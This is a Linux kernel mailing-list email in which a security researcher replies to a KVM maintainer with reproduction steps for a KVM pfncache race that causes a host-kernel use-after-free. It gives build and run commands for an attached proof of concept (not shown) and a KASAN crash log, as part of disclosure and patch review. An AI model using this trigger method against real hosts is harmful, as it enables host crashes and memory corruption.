Received: from mail-vk1-f179.google.com (mail-vk1-f179.google.com [209.85.221.179])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 0D35133556D
	for <stable@vger.kernel.org>; Tue, 11 Aug 2026 17:17:10 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.221.179
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1786468633; cv=pass; b=VPdGb/9f+ghIu68hHhZd32JownjZ4TiOHHtxUBmCScNzbaFXT9yrOgSQlloNjShUoKytcPEyfMEuGKt4iHh9jDuFmHALjjncZwooFvqShJEMa/uCR412XyYTt6Z5ezTUqf8QntHCRjzfP1V7InXIh9WQZbpUrBRrSx6QxMW9qvg=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1786468633; c=relaxed/simple;
	bh=FDK1xyJorGkIaqm0fp7gq1wjtz+cTI2VLnaKwlNXF9w=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=QU6dSFdlbpvhi5QPCjXfIwiCgkS71YEp3qbTbi2vK07Yde+lGtqSdNrVaiXqOlFCO0YVpk9IRzA3V7sX5tkkhmLnu55AGCtGRdOEy7Zeuhx+0kr10sQcazRlOlq1ynxcqpJjUav9jH+Mi0Gr+c4neY8k/4a+/awmdOzdN9KVG4M=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=trailofbits.com; spf=pass smtp.mailfrom=trailofbits.com; dkim=pass (2048-bit key) header.d=trailofbits.com header.i=@trailofbits.com header.b=Ue87n9md; arc=pass smtp.client-ip=209.85.221.179
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=trailofbits.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=trailofbits.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=trailofbits.com header.i=@trailofbits.com header.b="Ue87n9md"
Received: by mail-vk1-f179.google.com with SMTP id 71dfb90a1353d-5bfa99f8ef8so899889e0c.0
        for <stable@vger.kernel.org>; Tue, 11 Aug 2026 10:17:10 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1786468630; cv=none;
        d=google.com; s=arc-20260327;
        b=nqFObWwDRKtSief58WT7CSXCVOsbY36WG2mVnXxXR494rAGCHLqpUeed0AintIls5d
         2YE8mteLlw36SQqylCa4dPypzyhLPOi9wK831YTA2lh1AQGypnwa78yXOyeNhrAchCxF
         TNsvlySAc/NB1XD0eZpQJLlFcMAE7pQatPH/aWyOTi4oKPnKu0bZBhJSIPSSs4fCSjeT
         yuv0d8O7IxrhOIoB+mS0Dteik7pOpmsjJ7Bvb2bAD7VOz0Y+VbGsAeVRS+o9z4q0MNyF
         qtbl8W9kV+eVO4+oAved2JqktsqwA5Xvb/cZwYMbI5DVxGoN221sEhV/UMrv/g5v5C9Z
         LhSw==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=cc:to:subject:message-id:date:from:in-reply-to:references
         :mime-version:dkim-signature;
        bh=TR3b/sMW+SCf0xFFz0wqJn4m2wh7f6wtV1/XLBvxW3s=;
        fh=vZAf+WROwGcGIS08F+JG7Qxhng7HY3oDfvdkzdDGG9Q=;
        b=pSumEIpieQzbCD+ciMt3BCXQb9N6nVgMmXiSQEggmuoos0UoMUCql8eHZEKyhf56n/
         vsq+H0hUvr0kum7DsAD8IFmMOGO6rYJvF1SgmvipsSXmZ196uVna4rfsgiDadYkYSGRn
         qoZ8LiTHXn6N+3nf6dfsPlEkKDkKat4S2ROdoXTvLyIhbgDhspIzsNVq5nZfaxp911JK
         E+JoUbVRMnuLF1m6E479+9e5eP1aWMOX/cuL1Q687mGxeUpAeX6A8MFdOTDNDQuQPptQ
         /VCQ9VcyPDyvMflNnSivgeCR5yOz/53E+aYdOGio6pCb2/wEVUCJCCZX4cMKTBjHmS5l
         zBqg==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=trailofbits.com; s=google; t=1786468630; x=1787073430; darn=vger.kernel.org;
        h=content-type:cc:to:subject:message-id:date:from:in-reply-to
         :references:mime-version:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=TR3b/sMW+SCf0xFFz0wqJn4m2wh7f6wtV1/XLBvxW3s=;
        b=Ue87n9mdzqwPKdwNzDU4AYQd0il+n95QYelGW9yCsOBe6kurFF0DePMP8eKhBdnwLE
         Z9sY0I8ci4mru5pomCR2vwl5Gwpo3k2LOk2WhCiKKFN3Skrjbrh8SIsn4SfUMIl/a+Sd
         tvrb98wkQJkYm96vCqm3Y32Icg6CXsCjT75VfRLp2cdnzfP02SHOsDD8IaomoWHico7P
         o20IY6P+PXD6ndoQ6JzbvKVNXqOZP7ndsw0P+h7LcgfwNMJCYP/sYNJOWPavyltCtklZ
         oPd9nmZILKLYwUMu+i2pv16H8Sqmqaiyz52cEPhZrvn+Z5xhQisuZvBLEmPL46DMlyEd
         4+tQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1786468630; x=1787073430;
        h=content-type:cc:to:subject:message-id:date:from:in-reply-to
         :references:mime-version:x-gm-gg:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to:content-type;
        bh=TR3b/sMW+SCf0xFFz0wqJn4m2wh7f6wtV1/XLBvxW3s=;
        b=GeWy39GFVrkLAUO8r7X3PnWDAInev9wSTo0lbP7t0rS3a2EMbG03+yV+4uaAKWRGFQ
         HBHhGV6VLQlpGGM4IOG8FZjbEmtAJcCHMtuMAWHXcWbQQXrsUYsx/9CQw3eIZn2x9fdd
         Jmpgt4EjP9M+ac0GD2vzDvypOypx68rYI01xlyVXuc3bcy2ITVb8KDM6PAC7xCSJ4DSg
         6zqjZEdug0hMhhpmKWXo/zgk0CYsO89AsL/WaJDFCi3Gtr9KvtJFGmBeoGjEseXhVfi8
         nEClyHMnVYj6w0OXvaj93raSLjd5xFipFFe5yb0jzLc83Jw2Q58kHFwJkfL9QLELgRtP
         17/g==
X-Forwarded-Encrypted: i=1; AHgh+Rq0CkW25UIom2ePI+XttsjtxLJeVMTwbRdrB9cj7wzOSK+P2FLZ195TNVzU/ELEtJzuS8DzG34=@vger.kernel.org
X-Gm-Message-State: AOJu0YynFE1OI5i/9Yz4K5wKmT7wUtnbs5sf63Z81Eyw+vSL7PqoN+q8
	zsLnpCpiDOfmGUrB9836mkgrGly7b2jt2zJxcZunm/yQRn6XXI9gPlCC14IdL5IwvYkNVypO019
	OGS1j6H1mMwUjI9sm4IAl0kel1DIA9yL/Ty4bxlRa5g==
X-Gm-Gg: AR+sD13/75UkGz0NY2lxoguZXj301DWsSLgQrYOLnsXLMkZZM466bKnfsJoQBGkkf8F
	OWQqbLNe4n1BgPq0hmuEVRMxBsWhPBtzeSTKS+oF+ul9QPGmm6o5YGq59gUvH2dBiH/+LdIuoyQ
	zrvjWGEYpzgTjffpvI0nOy4LK36QMw5BK5vuGuuVni5Th8b3HrRnJD58mJvYrUBcXr1JwlMEf2h
	Tw+51+ulxxbj6jsmy1N6QL6swMZJrzAMWz4IbJfFgR6omNmcxso+njxq1HJdXOaKNtJYFbgaA3z
	GA+IFZva3nQ4NkmXRxy9XtdWdIXlOqdNRpaoRLB7nX58uWghjnXvl1yFPQOahX4VZBgWKIuPNqI
	ERbY=
X-Received: by 2002:a05:6122:2190:b0:5c2:a30a:1a08 with SMTP id
 71dfb90a1353d-5c459ef26b0mr276323e0c.2.1786468629788; Tue, 11 Aug 2026
 10:17:09 -0700 (PDT)
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20260810152730.841260-1-david.lee@trailofbits.com> <ans0RzGmObCkAb6e@google.com>
In-Reply-To: <ans0RzGmObCkAb6e@google.com>
From: David Lee <david.lee@trailofbits.com>
Date: Tue, 11 Aug 2026 13:16:58 -0400
X-Gm-Features: AUfX_mwCHOrhyLp5hQoy0naXSv0yLnhX5b4mtu4i1iBzWMLQ8bHIiJmYCCIiMyg
Message-ID: <CAC_etQGgLq9fxr5kG=VmndnRENZZTFnLr_PKTHKiPYjn-zYuFA@mail.gmail.com>
Subject: Re: [PATCH] KVM: pfncache: track all MMU notifier invalidations
To: Sean Christopherson <seanjc@google.com>
Cc: pbonzini@redhat.com, Kyle Zeng <kylebot@openai.com>, 
	"Dominik 'Disconnect3d' Czarnota" <dominik.czarnota@trailofbits.com>, kvm@vger.kernel.org, 
	linux-kernel@vger.kernel.org, stable@vger.kernel.org, 
	David Woodhouse <dwmw2@infradead.org>
Content-Type: multipart/mixed; boundary="00000000000014f4670658c8a44c"

--00000000000014f4670658c8a44c
Content-Type: multipart/alternative; boundary="00000000000014f4670658c8a44a"

--00000000000014f4670658c8a44a
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Hi Sean,

Please refer to the attached reproducer.

Required configuration:
* CONFIG_KVM
* CONFIG_KVM_XEN
* An x86 KVM host

CONFIG_KASAN is not required for the vulnerability, but it is used to
produce the attached diagnostic output.

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D Reproduction =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Step 1: Build and boot an affected x86 kernel with CONFIG_KVM,
CONFIG_KVM_XEN, and CONFIG_KASAN enabled.

The confirmed kernel source revision is:

~
a13c140cc289c0b7b3770bce5b3ad42ab35074aa
~

Step 2: Compile the attached `poc.c`:

~
gcc -static -O2 -Wall -Wextra -pthread -o poc poc.c
~

Step 3: Run the PoC as a non-root user that has permission to open
`/dev/kvm`:

~
./poc
~

The PoC creates a KVM VM without any memslots, maps one anonymous page,
and runs two threads on separate CPUs. One thread repeatedly activates
and deactivates the Xen shared-info HVA cache. The other repeatedly
discards the backing page with `MADV_DONTNEED`.

The race is timing-dependent. The supplied PoC runs for 90 seconds. On
the confirmed test system it produced the attached KASAN report in
`splash.txt`.

Best regards,
David

On Tue, Aug 11, 2026 at 10:40=E2=80=AFAM Sean Christopherson <seanjc@google=
.com>
wrote:

> +David W
>
> On Mon, Aug 10, 2026, David Lee wrote:
> > From: Kyle Zeng <kylebot@openai.com>
> >
> > There is a race condition in KVM's gfn-to-pfn cache refresh and MMU
> > notifier handling. An HVA-backed cache can publish a stale PFN and
> > kernel virtual address after the corresponding userspace mapping has
> > been invalidated. The Xen shared-info HVA interface immediately reads
> > and writes through that stale address, resulting in a host-kernel
> > use-after-free.
> >
> > The cache refresh path in virt/kvm/pfncache.c drops gpc->lock while
> > resolving and mapping an HVA. It uses mn_active_invalidate_count and
> > mmu_invalidate_seq to detect an MMU notifier interval that overlaps
> > this unlocked window. However, mmu_invalidate_seq is advanced only
> > when the invalidated HVA overlaps a KVM memslot. HVA-backed caches are
> > explicitly allowed to refer to memory outside all memslots. If such an
> > invalidation starts and finishes while gpc->valid is false, the active
> > count returns to zero without a sequence change and the refresh accepts
> > a stale PFN.
> >
> > An unprivileged process with access to /dev/kvm can reach this path wit=
h
> > KVM_XEN_ATTR_TYPE_SHARED_INFO_HVA. KASAN-detected use-after-free in
> > kvm_xen_shared_info_init(). The affected function reads and writes Xen
> > wall-clock fields through the stale mapping, so the issue can cause a
> > host-kernel crash and memory corruption.
> >
> > The attached KASAN output confirms:
> >
> >   BUG: KASAN: use-after-free in kvm_xen_shared_info_init+0x344/0x3d0
> [kvm]
> >   Read of size 4 at addr ffff888046000900 by task poc/1266
> >
> > Add a notifier-specific sequence that advances for every completed
> > invalidate interval before mn_active_invalidate_count is decremented,
> > and use that sequence for pfncache retry. The existing barrier pairing
> > then guarantees refresh observes either an active invalidation or a
> > sequence change.
> >
> > Fixes: 721f5b0dda78 ("KVM: pfncache: allow a cache to be activated with
> a fixed (userspace) HVA")
> > Cc: stable@vger.kernel.org # 6.9+
> > Assisted-by: Codex:gpt-5.6-sol Codex:gpt-5.5-cyber
> > Signed-off-by: Kyle Zeng <kylebot@openai.com>
> > Co-developed-by: David Lee <david.lee@trailofbits.com>
> > Signed-off-by: David Lee <david.lee@trailofbits.com>
> > ---
> > Bug found and triaged by OpenAI Security Research and
> > validated by Trail of Bits.
> >
> > Trail of Bits has a reproducer for this bug that triggers a
> > KASAN use-after-free and can share if needed.
>
> Go ahead and share, syzbot has been reporting this race for some time,
> i.e. how
> to repro this isn't exactly a secret, and the more testcases the better.
> This is
> also like the fourth or fifth proposed fix for the bug (bugs?).  I think
> the most
> recent version of the fix we are pursuing is here:
>
> https://lore.kernel.org/all/20260811094829.98794-12-dwmw2@infradead.org
>
> Thanks!
>

--00000000000014f4670658c8a44a
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<div dir=3D"ltr">Hi Sean,<br><br>Please refer to the attached reproducer.<b=
r><br>Required configuration:<br>* CONFIG_KVM<br>* CONFIG_KVM_XEN<br>* An x=
86 KVM host<br><br>CONFIG_KASAN is not required for the vulnerability, but =
it is used to<br>produce the attached diagnostic output.<br><br>=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D Reproduction =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D<br>Step 1=
: Build and boot an affected x86 kernel with CONFIG_KVM,<br>CONFIG_KVM_XEN,=
 and CONFIG_KASAN enabled.<br><br>The confirmed kernel source revision is:<=
br><br>~<br>a13c140cc289c0b7b3770bce5b3ad42ab35074aa<br>~<br><br>Step 2: Co=
mpile the attached `poc.c`:<br><br>~<br>gcc -static -O2 -Wall -Wextra -pthr=
ead -o poc poc.c<br>~<br><br>Step 3: Run the PoC as a non-root user that ha=
s permission to open<br>`/dev/kvm`:<br><br>~<br>./poc<br>~<br><br>The PoC c=
reates a KVM VM without any memslots, maps one anonymous page,<br>and runs =
two threads on separate CPUs. One thread repeatedly activates<br>and deacti=
vates the Xen shared-info HVA cache. The other repeatedly<br>discards the b=
acking page with `MADV_DONTNEED`.<br><br>The race is timing-dependent. The =
supplied PoC runs for 90 seconds. On<br>the confirmed test system it produc=
ed the attached KASAN report in<br>`splash.txt`.<br><br>Best regards,<br>Da=
vid</div><br><div class=3D"gmail_quote gmail_quote_container"><div dir=3D"l=
tr" class=3D"gmail_attr">On Tue, Aug 11, 2026 at 10:40=E2=80=AFAM Sean Chri=
stopherson &lt;<a href=3D"mailto:seanjc@google.com">seanjc@google.com</a>&g=
t; wrote:<br></div><blockquote class=3D"gmail_quote" style=3D"margin:0px 0p=
x 0px 0.8ex;border-left:1px solid rgb(204,204,204);padding-left:1ex">+David=
 W<br>
<br>
On Mon, Aug 10, 2026, David Lee wrote:<br>
&gt; From: Kyle Zeng &lt;<a href=3D"mailto:kylebot@openai.com" target=3D"_b=
lank">kylebot@openai.com</a>&gt;<br>
&gt; <br>
&gt; There is a race condition in KVM&#39;s gfn-to-pfn cache refresh and MM=
U<br>
&gt; notifier handling. An HVA-backed cache can publish a stale PFN and<br>
&gt; kernel virtual address after the corresponding userspace mapping has<b=
r>
&gt; been invalidated. The Xen shared-info HVA interface immediately reads<=
br>
&gt; and writes through that stale address, resulting in a host-kernel<br>
&gt; use-after-free.<br>
&gt; <br>
&gt; The cache refresh path in virt/kvm/pfncache.c drops gpc-&gt;lock while=
<br>
&gt; resolving and mapping an HVA. It uses mn_active_invalidate_count and<b=
r>
&gt; mmu_invalidate_seq to detect an MMU notifier interval that overlaps<br=
>
&gt; this unlocked window. However, mmu_invalidate_seq is advanced only<br>
&gt; when the invalidated HVA overlaps a KVM memslot. HVA-backed caches are=
<br>
&gt; explicitly allowed to refer to memory outside all memslots. If such an=
<br>
&gt; invalidation starts and finishes while gpc-&gt;valid is false, the act=
ive<br>
&gt; count returns to zero without a sequence change and the refresh accept=
s<br>
&gt; a stale PFN.<br>
&gt; <br>
&gt; An unprivileged process with access to /dev/kvm can reach this path wi=
th<br>
&gt; KVM_XEN_ATTR_TYPE_SHARED_INFO_HVA. KASAN-detected use-after-free in<br=
>
&gt; kvm_xen_shared_info_init(). The affected function reads and writes Xen=
<br>
&gt; wall-clock fields through the stale mapping, so the issue can cause a<=
br>
&gt; host-kernel crash and memory corruption.<br>
&gt; <br>
&gt; The attached KASAN output confirms:<br>
&gt; <br>
&gt;=C2=A0 =C2=A0BUG: KASAN: use-after-free in kvm_xen_shared_info_init+0x3=
44/0x3d0 [kvm]<br>
&gt;=C2=A0 =C2=A0Read of size 4 at addr ffff888046000900 by task poc/1266<b=
r>
&gt; <br>
&gt; Add a notifier-specific sequence that advances for every completed<br>
&gt; invalidate interval before mn_active_invalidate_count is decremented,<=
br>
&gt; and use that sequence for pfncache retry. The existing barrier pairing=
<br>
&gt; then guarantees refresh observes either an active invalidation or a<br=
>
&gt; sequence change.<br>
&gt; <br>
&gt; Fixes: 721f5b0dda78 (&quot;KVM: pfncache: allow a cache to be activate=
d with a fixed (userspace) HVA&quot;)<br>
&gt; Cc: <a href=3D"mailto:stable@vger.kernel.org" target=3D"_blank">stable=
@vger.kernel.org</a> # 6.9+<br>
&gt; Assisted-by: Codex:gpt-5.6-sol Codex:gpt-5.5-cyber<br>
&gt; Signed-off-by: Kyle Zeng &lt;<a href=3D"mailto:kylebot@openai.com" tar=
get=3D"_blank">kylebot@openai.com</a>&gt;<br>
&gt; Co-developed-by: David Lee &lt;<a href=3D"mailto:david.lee@trailofbits=
.com" target=3D"_blank">david.lee@trailofbits.com</a>&gt;<br>
&gt; Signed-off-by: David Lee &lt;<a href=3D"mailto:david.lee@trailofbits.c=
om" target=3D"_blank">david.lee@trailofbits.com</a>&gt;<br>
&gt; ---<br>
&gt; Bug found and triaged by OpenAI Security Research and<br>
&gt; validated by Trail of Bits.<br>
&gt; <br>
&gt; Trail of Bits has a reproducer for this bug that triggers a<br>
&gt; KASAN use-after-free and can share if needed.<br>
<br>
Go ahead and share, syzbot has been reporting this race for some time, i.e.=
 how<br>
to repro this isn&#39;t exactly a secret, and the more testcases the better=
.=C2=A0 This is<br>
also like the fourth or fifth proposed fix for the bug (bugs?).=C2=A0 I thi=
nk the most<br>
recent version of the fix we are pursuing is here:<br>
<br>
<a href=3D"https://lore.kernel.org/all/20260811094829.98794-12-dwmw2@infrad=
ead.org" rel=3D"noreferrer" target=3D"_blank">https://lore.kernel.org/all/2=
0260811094829.98794-12-dwmw2@infradead.org</a><br>
<br>
Thanks!<br>
</blockquote></div>

--00000000000014f4670658c8a44a--
--00000000000014f4670658c8a44c
Content-Type: text/plain; charset="US-ASCII"; name="splash.txt"
Content-Disposition: attachment; filename="splash.txt"
Content-Transfer-Encoding: base64
Content-ID: <f_msox9arh1>
X-Attachment-Id: f_msox9arh1

WyAgMjMyLjMyNzg0NF0gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT09PT09PT09ClsgIDIzMi4zMjc4NDRdIEJVRzogS0FTQU46IHVzZS1h
ZnRlci1mcmVlIGluIGt2bV94ZW5fc2hhcmVkX2luZm9faW5pdCsweDM0NC8weDNkMCBba3ZtXQpb
ICAyMzIuMzI3ODQ0XSBSZWFkIG9mIHNpemUgNCBhdCBhZGRyIGZmZmY4ODgwNDYwMDA5MDAgYnkg
dGFzayBwb2MvMTI2NgpbICAyMzIuMzI3ODQ0XSAKWyAgMjMyLjMyNzg0NF0gQ1BVOiAwIFVJRDog
MTAwMCBQSUQ6IDEyNjYgQ29tbTogcG9jIE5vdCB0YWludGVkIDcuMi4wLXJjMy1rYXNhbiAjMSBQ
UkVFTVBUKGxhenkpIApbICAyMzIuMzI3ODQ0XSBIYXJkd2FyZSBuYW1lOiBRRU1VIFVidW50dSAy
Ni4wNCBQQyAoaTQ0MEZYICsgUElJWCwgMTk5NiksIEJJT1MgMS4xNy4wLWRlYmlhbi0xLjE3LjAt
MXVidW50dTEgMDQvMDEvMjAxNApbICAyMzIuMzI3ODQ0XSBDYWxsIFRyYWNlOgpbICAyMzIuMzI3
ODQ0XSAgPFRBU0s+ClsgIDIzMi4zMjc4NDRdICBkdW1wX3N0YWNrX2x2bCsweDVmLzB4OTAKWyAg
MjMyLjMyNzg0NF0gIHByaW50X3JlcG9ydCsweDE1Yi8weDRlYwpbICAyMzIuMzI3ODQ0XSAgPyBf
X3BmeF9fcmF3X3NwaW5fbG9ja19pcnFzYXZlKzB4MTAvMHgxMApbICAyMzIuMzI3ODQ0XSAgPyBr
YXNhbl9hZGRyX3RvX3NsYWIrMHhkLzB4ODAKWyAgMjMyLjMyNzg0NF0gIGthc2FuX3JlcG9ydCsw
eGYyLzB4MTMwClsgIDIzMi4zMjc4NDRdICA/IGt2bV94ZW5fc2hhcmVkX2luZm9faW5pdCsweDM0
NC8weDNkMCBba3ZtXQpbICAyMzIuMzI3ODQ0XSAgPyBrdm1feGVuX3NoYXJlZF9pbmZvX2luaXQr
MHgzNDQvMHgzZDAgW2t2bV0KWyAgMjMyLjMyNzg0NF0gIF9fYXNhbl9yZXBvcnRfbG9hZF9uX25v
YWJvcnQrMHhmLzB4MjAKWyAgMjMyLjMyNzg0NF0gIGt2bV94ZW5fc2hhcmVkX2luZm9faW5pdCsw
eDM0NC8weDNkMCBba3ZtXQpbICAyMzIuMzI3ODQ0XSAga3ZtX3hlbl9odm1fc2V0X2F0dHIrMHhi
ZTAvMHgxYTQwIFtrdm1dClsgIDIzMi4zMjc4NDRdICA/IF9fcGZ4X2t2bV94ZW5faHZtX3NldF9h
dHRyKzB4MTAvMHgxMCBba3ZtXQpbICAyMzIuMzI3ODQ0XSAgPyBfX2thc2FuX2NoZWNrX3dyaXRl
KzB4MTQvMHgzMApbICAyMzIuMzI3ODQ0XSAga3ZtX2FyY2hfdm1faW9jdGwrMHgyODMvMHgxNzYw
IFtrdm1dClsgIDIzMi4zMjc4NDRdICA/IF9fa2FzYW5fY2hlY2tfd3JpdGUrMHgxNC8weDMwClsg
IDIzMi4zMjc4NDRdICA/IF9fcGZ4X2t2bV9hcmNoX3ZtX2lvY3RsKzB4MTAvMHgxMCBba3ZtXQpb
ICAyMzIuMzI3ODQ0XSAgPyBfX3BmeF9tdXRleF91bmxvY2srMHgxMC8weDEwClsgIDIzMi4zMjc4
NDRdICA/IF9fcGZ4X19yYXdfc3Bpbl9sb2NrKzB4MTAvMHgxMApbICAyMzIuMzI3ODQ0XSAgPyBf
X2thc2FuX2NoZWNrX3dyaXRlKzB4MTQvMHgzMApbICAyMzIuMzI3ODQ0XSAgPyBtdXRleF91bmxv
Y2srMHg4My8weGUwClsgIDIzMi4zMjc4NDRdICA/IF9fcGZ4X211dGV4X3VubG9jaysweDEwLzB4
MTAKWyAgMjMyLjMyNzg0NF0gID8ga3ZtX2dwY19kZWFjdGl2YXRlKzB4OGQvMHg1MzAgW2t2bV0K
WyAgMjMyLjMyNzg0NF0gID8ga3ZtX3hlbl9odm1fc2V0X2F0dHIrMHgzNzcvMHgxYTQwIFtrdm1d
ClsgIDIzMi4zMjc4NDRdICA/IGt2bV9hcmNoX3ZtX2lvY3RsKzB4MjgzLzB4MTc2MCBba3ZtXQpb
ICAyMzIuMzI3ODQ0XSAgPyBfX3BmeF9rdm1feGVuX2h2bV9zZXRfYXR0cisweDEwLzB4MTAgW2t2
bV0KWyAgMjMyLjMyNzg0NF0gID8gX19wZnhfa3ZtX2FyY2hfdm1faW9jdGwrMHgxMC8weDEwIFtr
dm1dClsgIDIzMi4zMjc4NDRdICA/IF9fa2FzYW5fY2hlY2tfd3JpdGUrMHgxNC8weDMwClsgIDIz
Mi4zMjc4NDRdICA/IGt2bV9hcmNoX3ZtX2lvY3RsKzB4MjgzLzB4MTc2MCBba3ZtXQpbICAyMzIu
MzI3ODQ0XSAgPyBrdm1fZ3BjX2RlYWN0aXZhdGUrMHg4ZC8weDUzMCBba3ZtXQpbICAyMzIuMzI3
ODQ0XSAgPyBfX3BmeF9rdm1feGVuX2h2bV9zZXRfYXR0cisweDEwLzB4MTAgW2t2bV0KWyAgMjMy
LjMyNzg0NF0gID8gX19wZnhfa3ZtX3hlbl9odm1fc2V0X2F0dHIrMHgxMC8weDEwIFtrdm1dClsg
IDIzMi4zMjc4NDRdICA/IGt2bV9hcmNoX3ZtX2lvY3RsKzB4MjgzLzB4MTc2MCBba3ZtXQpbICAy
MzIuMzI3ODQ0XSAgPyBrdm1fYXJjaF92bV9pb2N0bCsweDI4My8weDE3NjAgW2t2bV0KWyAgMjMy
LjMyNzg0NF0gIGt2bV92bV9pb2N0bCsweDEyZjQvMHgzZmUwIFtrdm1dClsgIDIzMi4zMjc4NDRd
ICA/IF9fcGZ4X2t2bV92bV9pb2N0bCsweDEwLzB4MTAgW2t2bV0KWyAgMjMyLjMyNzg0NF0gID8g
a3ZtX3ZtX2lvY3RsKzB4MTJmNC8weDNmZTAgW2t2bV0KWyAgMjMyLjMyNzg0NF0gID8ga3ZtX3Zt
X2lvY3RsKzB4MTJmNC8weDNmZTAgW2t2bV0KWyAgMjMyLjMyNzg0NF0gID8ga3ZtX3ZtX2lvY3Rs
KzB4MTJmNC8weDNmZTAgW2t2bV0KWyAgMjMyLjMyNzg0NF0gID8gX19wZnhfa3ZtX3ZtX2lvY3Rs
KzB4MTAvMHgxMCBba3ZtXQpbICAyMzIuMzI3ODQ0XSAgPyBfX3BmeF9rdm1fdm1faW9jdGwrMHgx
MC8weDEwIFtrdm1dClsgIDIzMi4zMjc4NDRdICA/IGt2bV92bV9pb2N0bCsweDEyZjQvMHgzZmUw
IFtrdm1dClsgIDIzMi4zMjc4NDRdICA/IGt2bV92bV9pb2N0bCsweDEyZjQvMHgzZmUwIFtrdm1d
ClsgIDIzMi4zMjc4NDRdICA/IGt2bV92bV9pb2N0bCsweDEyZjQvMHgzZmUwIFtrdm1dClsgIDIz
Mi4zMjc4NDRdICA/IF9fcGZ4X2t2bV92bV9pb2N0bCsweDEwLzB4MTAgW2t2bV0KWyAgMjMyLjMy
Nzg0NF0gID8ga3ZtX3ZtX2lvY3RsKzB4MTJmNC8weDNmZTAgW2t2bV0KWyAgMjMyLjMyNzg0NF0g
ID8ga3ZtX3ZtX2lvY3RsKzB4MTJmNC8weDNmZTAgW2t2bV0KWyAgMjMyLjMyNzg0NF0gID8gX19w
Znhfa3ZtX3ZtX2lvY3RsKzB4MTAvMHgxMCBba3ZtXQpbICAyMzIuMzI3ODQ0XSAgPyBfX3BmeF9r
dm1fdm1faW9jdGwrMHgxMC8weDEwIFtrdm1dClsgIDIzMi4zMjc4NDRdICA/IGt2bV92bV9pb2N0
bCsweDEyZjQvMHgzZmUwIFtrdm1dClsgIDIzMi4zMjc4NDRdICA/IGt2bV92bV9pb2N0bCsweDEy
ZjQvMHgzZmUwIFtrdm1dClsgIDIzMi4zMjc4NDRdICA/IGt2bV92bV9pb2N0bCsweDEyZjQvMHgz
ZmUwIFtrdm1dClsgIDIzMi4zMjc4NDRdICA/IGt2bV92bV9pb2N0bCsweDEyZjQvMHgzZmUwIFtr
dm1dClsgIDIzMi4zMjc4NDRdICA/IF9fcGZ4X2RvX3Zmc19pb2N0bCsweDEwLzB4MTAKWyAgMjMy
LjMyNzg0NF0gID8gX19wZnhfZG9fdmZzX2lvY3RsKzB4MTAvMHgxMApbICAyMzIuMzI3ODQ0XSAg
PyBfX3BmeF9rdm1fdm1faW9jdGwrMHgxMC8weDEwIFtrdm1dClsgIDIzMi4zMjc4NDRdICA/IF9f
cGZ4X2t2bV92bV9pb2N0bCsweDEwLzB4MTAgW2t2bV0KWyAgMjMyLjMyNzg0NF0gID8gX19wZnhf
ZG9fdmZzX2lvY3RsKzB4MTAvMHgxMApbICAyMzIuMzI3ODQ0XSAgPyBfX3BmeF9rdm1fdm1faW9j
dGwrMHgxMC8weDEwIFtrdm1dClsgIDIzMi4zMjc4NDRdICA/IF9fcGZ4X2t2bV92bV9pb2N0bCsw
eDEwLzB4MTAgW2t2bV0KWyAgMjMyLjMyNzg0NF0gID8gX19wZnhfZG9fdmZzX2lvY3RsKzB4MTAv
MHgxMApbICAyMzIuMzI3ODQ0XSAgPyBfX3BmeF9kb192ZnNfaW9jdGwrMHgxMC8weDEwClsgIDIz
Mi4zMjc4NDRdICA/IF9fa2FzYW5fY2hlY2tfd3JpdGUrMHgxNC8weDMwClsgIDIzMi4zMjc4NDRd
ICA/IGZkZ2V0KzB4MzBkLzB4NGIwClsgIDIzMi4zMjc4NDRdICBfX3g2NF9zeXNfaW9jdGwrMHgx
NDcvMHgxZTAKWyAgMjMyLjMyNzg0NF0gIHg2NF9zeXNfY2FsbCsweDEwM2IvMHgyMzkwClsgIDIz
Mi4zMjc4NDRdICBkb19zeXNjYWxsXzY0KzB4ZGQvMHg2NDAKWyAgMjMyLjMyNzg0NF0gID8gX19w
ZnhfZG9fdmZzX2lvY3RsKzB4MTAvMHgxMApbICAyMzIuMzI3ODQ0XSAgPyBfX2thc2FuX2NoZWNr
X3dyaXRlKzB4MTQvMHgzMApbICAyMzIuMzI3ODQ0XSAgPyBfX2thc2FuX2NoZWNrX3dyaXRlKzB4
MTQvMHgzMApbICAyMzIuMzI3ODQ0XSAgPyBmcHV0KzB4MjcvMHhhMApbICAyMzIuMzI3ODQ0XSAg
